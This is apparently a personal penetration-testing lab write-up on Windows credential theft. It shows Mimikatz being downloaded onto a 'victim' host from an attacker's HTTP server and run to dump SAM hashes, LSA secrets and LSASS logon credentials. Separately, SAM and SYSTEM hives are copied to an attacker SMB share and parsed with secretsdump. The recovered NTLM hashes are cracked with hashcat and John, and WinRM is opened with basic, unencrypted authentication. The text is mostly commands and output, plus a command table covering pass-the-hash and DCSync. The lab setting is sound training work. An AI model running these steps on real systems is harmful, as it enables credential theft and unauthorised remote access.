#### What is the SAM file located?
> Path: ``C:\Windows\System32\config\SAM``

- This is **a registry hive file**, not a regular text file. It’s loaded into memory when Windows boots and is protected by the OS.

> Important: We can't open or edit this file directly while Windows is running because it’s locked by the system process (``SYSTEM``).


##### Why Can’t You Access It Directly?
- By default it cannot be directly accessed, since it is locked by the operating system.”

- Windows locks the SAM file to prevent unauthorized access.
- Even administrators can’t read it via Explorer or command line tools like ``type`` or ``copy``.
- However, backup copies may exist:
  - In ``C:\Windows\Repair\``
  - In ``C:\Windows\System32\config\RegBack\``
  - Or created manually during system backups.

````
cd C:\Windows\System32\config
ls
````
<img width="734" height="588" alt="image" src="https://github.com/user-attachments/assets/2a050b79-a54a-47ac-b826-408dcff4d332" />


### ow Do Attackers / Ethical Hackers Extract SAM Data?
- The slide mentions two common methods (with dropdown arrows):

##### SAM Dump with SeBackupPrivilege
- This is a technique where an attacker gains the SeBackupPrivilege (a Windows privilege usually given to Backup Operators).
- With this privilege, you can bypass normal file permissions and copy locked system files — including SAM.
- Tools like AccessChk or PowerShell can check/enable this privilege.
- Once you have the SAM file, you can extract hashes using tools like pwdump, SamDump2, or Mimikatz.


##### Mimikatz to dump LSASS Process
- ``LSASS.exe`` (Local Security Authority Subsystem Service) holds ``live credentials in memory``, including NTLM hashes, Kerberos tickets, and sometimes even plaintext passwords (if enabled).
- Mimikatz can inject into LSASS and extract these credentials.
- This is ``different from SAM dumping``, SAM = stored hashes on disk; LSASS = live credentials in RAM.

> Note: Modern Windows systems (especially with Defender, Credential Guard, or LSA Protection) block direct access to LSASS. Bypasses require advanced techniques.



#### About those REd Scribbles
`c - +`:
- **``C`` = Critical**: this section is important
- **``—`` = minus / remove?**: maybe crossing out something?
- **``+`` = add / focus** here?


---


### 2. Automate tool (mimikatz):  

#### Download **mimikatz**
- In this I download on kali linux and transfer to the victim.
- First go to this source to download: https://github.com/gentilkiwi/mimikatz
<img width="1914" height="854" alt="image" src="https://github.com/user-attachments/assets/41d9f682-c62b-4e1f-b6d8-c329bda6395b" />


##### On kali i start download:
- In this I was create my folder name ``tools``, so I go to my folder:
````
cd Tools
````
<img width="352" height="145" alt="image" src="https://github.com/user-attachments/assets/e09c58f6-895d-4be9-ab53-0be5bc983bfa" />


````
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
````
<img width="1899" height="641" alt="image" src="https://github.com/user-attachments/assets/d3244abe-223a-4432-b99f-80fc0d001a2a" />


##### Extract the ZIP:
````
unzip mimikatz_trunk.zip -d mimikatz
````
<img width="492" height="382" alt="image" src="https://github.com/user-attachments/assets/12be4fbe-43cf-4e36-9ffa-95b12a14dae3" />


````
ls mimikatz/x64/
````
<img width="571" height="96" alt="image" src="https://github.com/user-attachments/assets/3c581251-2a57-4c63-af19-193e0705b11a" />



##### Transfer Mimikatz to Windows
````
cd mimikatz/x64
python3 -m http.server 8000
````
<img width="659" height="220" alt="image" src="https://github.com/user-attachments/assets/e0e98079-b7ef-4134-8d4b-9f5137193b2e" />



##### On victim:
- On victim first i check folder:
<img width="534" height="793" alt="image" src="https://github.com/user-attachments/assets/d6b48209-c9f4-4357-9c70-e68766ca9bad" />

````
Invoke-WebRequest -Uri "http://192.168.127.128:8000/mimikatz.exe" -OutFile "C:\Users\k4n0ng\Helo\mimikatz.exe"
````
<img width="1205" height="90" alt="image" src="https://github.com/user-attachments/assets/200d6ac7-f10d-468d-8a9f-a3dfb17a4ffa" />

- Check:
````
ls C:\Users\k4n0ng\Helo\mimikatz.exe
````
<img width="1212" height="267" alt="image" src="https://github.com/user-attachments/assets/a60b2e61-515c-4429-81ed-66015628c266" />


- After I go to my folder:
````
cd Helo
ls
````
<img width="701" height="710" alt="image" src="https://github.com/user-attachments/assets/b873e596-a89e-45cd-8a31-df6510e1929f" />

- `Helo` is my folder name.

> Note: In thi swe need to run it as `Administrator`.


#### Run Mimikatz on Windows
````
.\mimikatz.exe
````
<img width="727" height="237" alt="image" src="https://github.com/user-attachments/assets/323d7b48-038a-43b7-b1b3-620dbb059cf3" />

- This is where the real magic happens. Now we can start dumping credentials, hashes, tickets, and more.

> In this we test it in as `Administrator`.



##### To get help
````
?
help
````
<img width="873" height="724" alt="image" src="https://github.com/user-attachments/assets/2391b1e1-2838-4f70-8d60-0cf5f9875378" />


#####  Enable Debug Privilege (Required for Most Actions)
````
privilege::debug
````
<img width="724" height="294" alt="image" src="https://github.com/user-attachments/assets/aa6e27b9-0f8a-478e-afa8-b73b7e06cc30" />

- Now we see `Privilege '20' OK`.
- This enables ``SeDebugPrivilege``, which lets Mimikatz access protected processes like LSASS.


##### Elevate Token to SYSTEM (If You're Not Already SYSTEM)
````
token::elevate
````
<img width="1330" height="196" alt="image" src="https://github.com/user-attachments/assets/db91bde8-ad86-4026-9b60-92a9c535db8a" />

- This `Impersonates` a SYSTEM token (critical for SAM/LSA access).


##### Dump local account hashes(SAM)
````
lsadump::sam
````
<img width="912" height="658" alt="image" src="https://github.com/user-attachments/assets/18a87f8e-6410-44e5-8b58-3bbdd31abe3e" />

<img width="925" height="687" alt="image" src="https://github.com/user-attachments/assets/acb87bea-f14e-412a-ba5f-4a89bd7f990d" />

- ``lsadump``: tells Mimikatz to interact with the Local Security Authority (LSA), which manages authentication secrets in Windows.
- ``sam``: specifically targets the Security Account Manager (SAM) database, where Windows stores local user account information and password hashes.

- It extracts local user account details from the SAM database.
  - **Domain / Local SID**: identifies the machine and security identifier.
  - **SysKey / SAMKey**: keys used to protect the SAM database.
  - **RID (Relative Identifier)**: unique ID for each account (e.g., 500 = Administrator, 501 = Guest).
  - **Usernames**: local accounts (Administrator, Guest, DefaultAccount, WDAGUtilityAccount).
  - **NTLM Hashes**: password hashes for those accounts.
  - **Supplemental credentials**: Kerberos keys, NTLM-Strong values, etc.

- This command is used to list local accounts and extract their password hashes from the Windows SAM database.




##### Dump LSA secret 
````
lsadump::secrets
````
<img width="1833" height="438" alt="image" src="https://github.com/user-attachments/assets/6e2c463e-b37f-4817-8e11-74a4ab81da5a" />

- ``secrets``: specifically dumps **stored LSA secrets** from the registry. These are sensitive values Windows keeps for system operations and authentication.
- Useful for decrypting saved credentials or Wi-Fi passwords.

- This command is used to extract hidden authentication secrets that Windows stores for internal use. Examples include:
  - ``DPAPI_SYSTEM``: The system’s Data Protection API master key. This is used to encrypt/decrypt user secrets like saved browser passwords or credentials stored by applications.
  - ``NL$KM``: The cached domain logon key material. This is used when Windows caches credentials for offline logins.
  - ``LSA Keys``: Keys used to protect and encrypt other secrets in the registry.

- This command is used to dump sensitive system secrets (like DPAPI keys and cached logon material) from the Windows LSA, showing how attackers could leverage them if protections aren’t in place.



##### Dump live credentials from memory (class)
````
sekurlsa::logonpasswords
````
<img width="596" height="807" alt="image" src="https://github.com/user-attachments/assets/ba3e6dcb-870a-4351-b573-599fa37e828b" />

<img width="595" height="781" alt="image" src="https://github.com/user-attachments/assets/1c9a1506-5f47-43e5-b343-5a87ea8ea68e" />

- ``sekurlsa``: tells Mimikatz to interact with the **Security Support Provider (SSP) / Local Security Authority Subsystem Service (LSASS)**. LSASS is the Windows process that manages logon sessions and keeps credentials in memory.
- ``logonpasswords``: dumps all available logon sessions and the credentials (or credential material) stored in LSASS.

- This command is used to list all active logon sessions on the machine and extract authentication data. It shows:
  - ``Authentication Id / Session``: identifies each logon session.
  - ``User Name / Domain / SID``: the account logged in.
  - ``Logon Time``: when the session was created.
  - **Credential material**:
    - ``NTLM hash``: the password hash used for NTLM authentication.
    - ``SHA1 / DPAPI keys``: other cryptographic material tied to the account.
    - ``Kerberos / WDigest / Credman``: sometimes plaintext passwords or cached tokens (here they are (null), meaning no plaintext was stored).

- This command is used to extract logon session credentials (hashes, sometimes plaintext) from LSASS memory.


---

#### Command that we can use

##### Privilege & Token Setup (MUST RUN FIRST)
| Command            | Module    | Purpose                       |
| ------------------ | --------- | ----------------------------- |
| `help`             | core      | Shows available commands      |
| `version`          | core      | Displays Mimikatz version     |
| `privilege::debug` | privilege | Enables debug privilege       |
| `token::list`      | token     | Lists available access tokens |
| `token::elevate`   | token     | Attempts token elevation      |
| `token::whoami`    | token     | Shows current token identity  |

##### SAM & LSA Secrets (Local Account Hashes)
| Command            | Module  | Purpose                         |
| ------------------ | ------- | ------------------------------- |
| `lsadump::sam`     | lsadump | Dumps local SAM database        |
| `lsadump::secrets` | lsadump | Dumps LSA secrets               |
| `lsadump::cache`   | lsadump | Dumps cached domain credentials |

##### Live Credential Dumping (LSASS Memory)
| Command                    | Module   | Purpose                          |
| -------------------------- | -------- | -------------------------------- |
| `sekurlsa::logonpasswords` | sekurlsa | Extracts credentials from memory |
| `sekurlsa::msv`            | sekurlsa | Shows NTLM authentication data   |
| `sekurlsa::wdigest`        | sekurlsa | Displays WDigest credentials     |
| `sekurlsa::kerberos`       | sekurlsa | Shows Kerberos session data      |
| `sekurlsa::credman`        | sekurlsa | Dumps Credential Manager secrets |
| `sekurlsa::dpapi`          | sekurlsa | Extracts DPAPI secrets           |


##### Kerberos Ticket Operations
| Command                     | Module   | Purpose                          |
| --------------------------- | -------- | -------------------------------- |
| `sekurlsa::tickets`         | sekurlsa | Lists Kerberos tickets in memory |
| `sekurlsa::tickets /export` | sekurlsa | Exports Kerberos tickets         |
| `kerberos::list`            | kerberos | Lists Kerberos tickets           |
| `kerberos::purge`           | kerberos | Clears Kerberos tickets          |
| `kerberos::ptt <ticket>`    | kerberos | Injects Kerberos ticket          |



##### Pass-the-Hash / Pass-the-Ticket (Conceptual)
| Command         | Module   | Purpose                            |
| --------------- | -------- | ---------------------------------- |
| `sekurlsa::pth` | sekurlsa | Performs pass-the-hash technique   |
| `kerberos::ptt` | kerberos | Performs pass-the-ticket technique |


##### DPAPI & Vault Secrets
| Command            | Module | Purpose                        |
| ------------------ | ------ | ------------------------------ |
| `dpapi::masterkey` | dpapi  | Works with DPAPI master keys   |
| `dpapi::cred`      | dpapi  | Decrypts DPAPI credentials     |
| `vault::list`      | vault  | Lists Windows Vault entries    |
| `vault::cred`      | vault  | Dumps stored Vault credentials |


##### Domain / Trust Information
| Command           | Module  | Purpose                      |
| ----------------- | ------- | ---------------------------- |
| `lsadump::dcsync` | lsadump | Simulates domain replication |
| `lsadump::trust`  | lsadump | Displays domain trust info   |

##### Logging & Exit
| Command      | Module | Purpose               |
| ------------ | ------ | --------------------- |
| `log <file>` | core   | Logs output to a file |
| `exit`       | core   | Exits Mimikatz        |


---


### 3. SAM dump with SeBackupPrivilege

#### What is SeBackupPrivilege?
The **SeBackupPrivilege** is a system privilege that allows users or services to back up files. Since some files are locked for various reasons, the privilege allows users or services to bypass normal file security restrictions.

This privilege lets you read any file on the system, even locked ones like ``SAM`` and ``SYSTEM`` - which are normally inaccessible while Windows is running.

It’s granted by default to:
  - Backup Operators group
  - Administrators
  - Trusted backup software

> Security Risk: Because it can bypass all file permissions, it’s considered dangerous if misused. Should only be given to trusted users/services.


#### How to Get **SeBackupPrivilege**
- Check:
````
whoami
whoami /priv
````
<img width="817" height="377" alt="image" src="https://github.com/user-attachments/assets/7c2f5508-b11f-47ec-9d9b-6b730e0acaa2" />

- In this i use with ``normal user``.

````
net user k4n0ng
````
<img width="613" height="552" alt="image" src="https://github.com/user-attachments/assets/d3adcc46-3b1b-4b5d-815a-7b809ad7e2bd" />

- Now we don't see any `SeBackupPrivilege` file.


##### Add User to **Backup Operators** Group (Recommended)
- In this it require `Administrator` on victim:
````
Add-LocalGroupMember -Group "Backup Operators" -Member "k4n0ng"
````
<img width="961" height="130" alt="image" src="https://github.com/user-attachments/assets/64f79735-093e-466b-b062-9011618d3beb" />

- After I check agai.

##### Check SeBackupPrivilege:
````
net user k4n0ng
````
<img width="740" height="552" alt="image" src="https://github.com/user-attachments/assets/8723debb-02be-4957-bcb9-fc7309452100" />

- Now I see `Local Group Memberships      *Administrators       *Backup Operators ``.

- If we want to remove it.

##### Remove User from "Backup Operators"
- First I check:
````
net user k4n0ng
````
<img width="825" height="643" alt="image" src="https://github.com/user-attachments/assets/78a60f80-e9d0-4078-aa3f-478e627c8268" />


- Now i see `SeBackupPrivilege`.

- After Remove:
````
Remove-LocalGroupMember -Group "Backup Operators" -Member "k4n0ng"
````
<img width="997" height="661" alt="image" src="https://github.com/user-attachments/assets/aabb319b-b82b-462c-b545-b84df100a6a7" />

- Now we don't see `SeBackupPrivilege`.




#### How to Dump SAM & SYSTEM Files Using This Privilege
- Open PowerShell
````
reg save hklm\sam C:\Users\k4n0ng\Desktop\SAM.hive
````
<img width="897" height="168" alt="image" src="https://github.com/user-attachments/assets/72694913-76a1-46cd-be6a-f1e4ec7b58ea" />

- Save SYSTEM Hive
````
reg save hklm\system C:\Users\k4n0ng\Desktop\SYSTEM.hive
````
<img width="925" height="300" alt="image" src="https://github.com/user-attachments/assets/4a7c26e1-e629-4ab7-829a-cc7cbf0efdaf" />



##### Use SMB Share (Impacket)
- On kali:
````
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share .
````
<img width="779" height="164" alt="image" src="https://github.com/user-attachments/assets/f1b15b6d-491c-4481-8539-7343d41f39f8" />


- On Windows (CMD/PowerShell):
````
copy C:\Users\k4n0ng\Desktop\SAM.hive \\192.168.127.128\share\
copy C:\Users\k4n0ng\Desktop\SYSTEM.hive \\192.168.127.128\share\
````
<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/037275f2-82ef-4cb5-91ef-05e239306fb8" />

- `192.168.127.128`: Is my kali IP.
- `k4n0ng`: is my name of target.


##### After on kali:
````
ls -la ~/SAM.hive ~/SYSTEM.hive
````
<img width="765" height="195" alt="image" src="https://github.com/user-attachments/assets/cdbafa9a-9fe2-46e9-a5bd-68991e6dc4da" />


##### Extract Hashes
````
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
````
<img width="1207" height="272" alt="image" src="https://github.com/user-attachments/assets/402742e0-af3e-4a68-a6ae-b26026a79afe" />


##### Save to file:
````
sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL > hashes.txt
cat hashes.txt
````
<img width="1312" height="322" alt="image" src="https://github.com/user-attachments/assets/c59b48aa-38bb-46f0-8e15-850522dd5ce3" />


##### Crack password:
- In this I have my own wordlist:
````
cd /usr/share/wordlists
ls
````
<img width="1507" height="787" alt="image" src="https://github.com/user-attachments/assets/25526690-82f3-4691-9741-2bb6266eacbf" />

- So this my wordlist:
````
/usr/share/wordlists/passwd.txt
````

##### Crack with hashcat:
````
hashcat -m 1000 hashes.txt /usr/share/wordlists/passwd.txt
````
<img width="1506" height="657" alt="image" src="https://github.com/user-attachments/assets/2404bbb8-602d-4ac7-9a0d-c254647866e2" />

<img width="793" height="796" alt="image" src="https://github.com/user-attachments/assets/d5fe217f-6555-4a70-be27-753fd65ae3cb" />

- Now I found the correct password: `401648a01c5ba2bdc6689d0c90d8bf1c:k4n0ng`.



##### Use Join The Ripper
- Clean the hash file
````
grep -v "^\[\*\]" hashes.txt | grep -v "^$" > clean_hashes.txt
cat clean_hashes.txt
````
<img width="854" height="227" alt="image" src="https://github.com/user-attachments/assets/66a010fb-95a4-418e-a0f4-9a7e2aeaf61f" />


````
john --format=NT --wordlist=/usr/share/wordlists/passwd.txt clean_hashes.txt
````
<img width="858" height="234" alt="image" src="https://github.com/user-attachments/assets/2b7d26a4-3eae-48e5-8c47-53e6c4de5430" />

- Now we got the correct target password: `k4n0ng           (k4n0ng)`.

- To see our result:
````
john --show --format=NT clean_hashes.txt
````
<img width="857" height="112" alt="image" src="https://github.com/user-attachments/assets/16a10cb3-a045-431e-b39e-275e3097ede8" />

- Now we see the correct password.



#### After we got target password

##### On tareget powershell:
- Enable WinRM with default settings
````
winrm quickconfig -q
````
<img width="1903" height="474" alt="image" src="https://github.com/user-attachments/assets/a42ea455-1d6d-46b1-9cef-65672ae356fc" />


- Allow remote management:
````
winrm set winrm/config/client '@{TrustedHosts="*"}'
````
<img width="763" height="362" alt="image" src="https://github.com/user-attachments/assets/3d17043a-8a83-4fa6-805d-fdd1630de471" />


````
winrm set winrm/config/service/Auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
````
<img width="1907" height="479" alt="image" src="https://github.com/user-attachments/assets/2424a5cb-b441-4db0-8dc9-2d80d979d375" />


- Verify on Windows:
````
netstat -ano | findstr :5985
````
<img width="763" height="110" alt="image" src="https://github.com/user-attachments/assets/ee56b656-490a-43c2-913f-f58a16c256f0" />

- Now we see it:
````
TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
````


- Verify firewall allow port 5985
````
netsh advfirewall firewall add rule name="WinRM HTTP" dir=in action=allow protocol=TCP localport=5985
````
<img width="1247" height="80" alt="image" src="https://github.com/user-attachments/assets/c95859a5-dd6c-4329-ab14-06214d549cc5" />

- Now we see `ok`.


##### Verify:
````
crackmapexec smb 192.168.127.148 -u k4n0ng -p k4n0ng
````
<img width="1611" height="106" alt="image" src="https://github.com/user-attachments/assets/c6ac62c8-eeb1-4ab4-87e5-06e82d615f68" />

- Now this password it correct.


---





## 5. Registry Hives

### What Are Windows Registry Hives?
The **Windows registry** is a hierarchical database structured following a tree-like data structure into registry hives.


### the Windows **settings database** and it stores:
- System configurations
- User preferences
- Installed software
- Security policies
- Credentials (sometimes)
- Malware persistence points

````
C:\Windows\System32\config\
````
- And for users:
````
C:\Users\<Username>\NTUSER.DAT
````


### Key Register Hive:
| Hive Name                      | Root Key | File Path                                                                                 |
| ------------------------------ | -------- | ----------------------------------------------------------------------------------------- |
| **HKEY_CLASSES_ROOT (HKCR)**   | HKCR     | `C:\Windows\System32\Config\SOFTWARE` + `C:\Windows\System32\Config\SYSTEM` (merged view) |
| **HKEY_LOCAL_MACHINE (HKLM)**  | HKLM     | `C:\Windows\System32\Config\SYSTEM`, `SOFTWARE`, `SECURITY`, `SAM`, `DEFAULT`             |
| **HKEY_CURRENT_USER (HKCU)**   | HKCU     | `C:\Users\<Username>\NTUSER.DAT`                                                          |
| **HKEY_USERS (HKU)**           | HKU      | `C:\Users\<Username>\NTUSER.DAT` (loaded under `HKU\<SID>` when user logs in)             |
| **HKEY_CURRENT_CONFIG (HKCC)** | HKCC     | `C:\Windows\System32\Config\SYSTEM` (subset of HKLM)                                      |


### Why Are Registry Hives Useful for Threat Intelligence?
These data sources are very useful for threat intelligence, as they can be used as Indicator of Compromise (IOC) for specific malware.

**Example**:
- Malware Persistence, Malware often adds itself to:
````
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
````
- Credential Dumping: Mimikatz uses ``HKLM\SAM`` and ``HKLM\SYSTEM`` to extract password hashes.

- Lateral Movement, Attackers may modify:
````
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareWks
````
- Enables admin shares (``C$``, ``ADMIN$``).

- Detection & Forensics, Security tools look for:
  - Unusual startup entries
  - Modified LSASS protections
  - Suspicious service configurations


### How to Access Registry Hives (For Analysis)

#### Use **reg** Command (Windows CMD/PowerShell)
````
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
````
<img width="747" height="77" alt="image" src="https://github.com/user-attachments/assets/1c725885-a020-45c3-82e2-fbec0622bca0" />

- This command I run on attacker machine it not see anything, cause it stay on local. But if i run on direct on windows:
<img width="806" height="105" alt="image" src="https://github.com/user-attachments/assets/f39d34fb-5ca9-4e10-867c-3dbc4bedc4d4" />

- Now i see `SecurityHealth` and `VMware User Process`.
- But if i run this command on attacker i will see:
````
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
````
<img width="1626" height="151" alt="image" src="https://github.com/user-attachments/assets/5f844f92-b61c-4ad1-bae3-2a93aec97875" />

- These commands are used to **check which applications are set to auto-start with Windows**, either system-wide (HKLM) or per-user (HKCU). It’s a quick way to spot both normal startup apps and potential suspicious entries.

- Key Differences:
  - **HKLM (HKEY_LOCAL_MACHINE)**
    - Startup entries that apply to all users on the computer.
    - Example: SecurityHealth (Windows Defender tray icon), VMware Tools.

  - **HKCU (HKEY_CURRENT_USER)**
    - Startup entries that apply only to the currently logged-in user.
    - Example: OneDrive (cloud sync), Microsoft Edge auto-launch.

#### Use PowerShell
````
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
````
<img width="991" height="85" alt="image" src="https://github.com/user-attachments/assets/e9312e5d-2f02-4819-9f51-87eeaf9b52f1" />

- If i run on attacker machine i don't see anything, cause it stay in local. But if I run on windows:
<img width="1397" height="272" alt="image" src="https://github.com/user-attachments/assets/5b442549-46d3-4491-ba6e-bd5c2101d228" />


- But I run this command on attacker it will see the same in victim:
````
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
````
<img width="1636" height="260" alt="image" src="https://github.com/user-attachments/assets/22f6f295-a197-4d7b-9e75-7a486a10ff2d" />

- On victim:
<img width="1795" height="270" alt="image" src="https://github.com/user-attachments/assets/b4ea2e1b-fd68-4567-8dd4-f5c6f2725be9" />



---

<h2 align="center"> Completed - Windows File Sensitive Data </h2>

<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
